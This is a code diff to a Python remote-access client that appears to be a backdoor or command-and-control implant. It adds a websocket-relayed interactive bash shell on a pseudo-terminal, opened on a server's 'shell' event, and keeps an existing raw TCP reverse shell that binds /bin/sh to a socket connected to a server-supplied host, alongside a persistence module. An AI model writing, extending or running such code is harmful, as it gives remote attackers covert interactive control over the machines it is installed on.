@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import os, subprocess, pickle, time, sys, json, traceback, socket, stat, urllib.request, platform, datetime # Stdlib
+import os, subprocess, pickle, time, sys, json, traceback, socket, stat, urllib.request, platform, datetime, pty, signal # Stdlib
 import asyncio
 
 try:
@@ -208,6 +208,52 @@ WantedBy=default.target
 		state["persistence"]["enabled"] = False
 		await msg({"event":"module_disabled", "name":"persistence"})
 
+class Shell:
+	async def shell_handler(websocket):
+		loop = asyncio.get_event_loop()
+
+		# Create a pseudo-terminal
+		master_fd, slave_fd = pty.openpty()
+
+		# Spawn shell
+		process = await asyncio.create_subprocess_exec(
+			"/bin/bash",
+			stdin=slave_fd,
+			stdout=slave_fd,
+			stderr=slave_fd,
+			preexec_fn=os.setsid  # Start new process group
+		)
+
+		# Read from PTY (in executor to avoid blocking)
+		async def read_pty():
+			try:
+				while True:
+					data = await loop.run_in_executor(None, os.read, master_fd, 1024)
+					if not data:
+						break
+					await websocket.send(data.decode(errors="ignore"))
+			except Exception as e:
+				print(f"[PTY read error] {e}")
+
+		# Write to PTY from WebSocket
+		async def write_pty():
+			try:
+				async for message in websocket:
+					os.write(master_fd, message.encode())
+			except Exception as e:
+				print(f"[WS recv error] {e}")
+
+		try:
+			await asyncio.gather(read_pty(), write_pty())
+		finally:
+			process.send_signal(signal.SIGTERM)
+			os.close(master_fd)
+			os.close(slave_fd)
+	
+	async def start_shell(tunnel_id):
+		async with connect(f"ws://{current_host}/machines/api/{state['version']}/tunnel/{tunnel_id}") as websocket:
+			await Shell.shell_handler(websocket)
+
 def load_state():
 	global state
 	if os.path.isfile(state_path):
@@ -273,7 +319,7 @@ async def main():
 									try:
 										print(c["type"])
 										match c["type"]:
-											case "shell":
+											case "tcpshell":
 												s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 												s.connect((c["host"],c["port"]))
 												subprocess.Popen(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
@@ -302,6 +348,8 @@ async def main():
 										await log(data={"event": "exception", "code": traceback.format_exc()}, tags=["fail","order","error"])
 									else:
 										await log(tags=["succes","order"])
+							elif data["event"] == "shell":
+								asyncio.create_task(Shell.start_shell(data["tunnel_id"]))
 						except ConnectionClosedError:
 							break
 						except Exception:
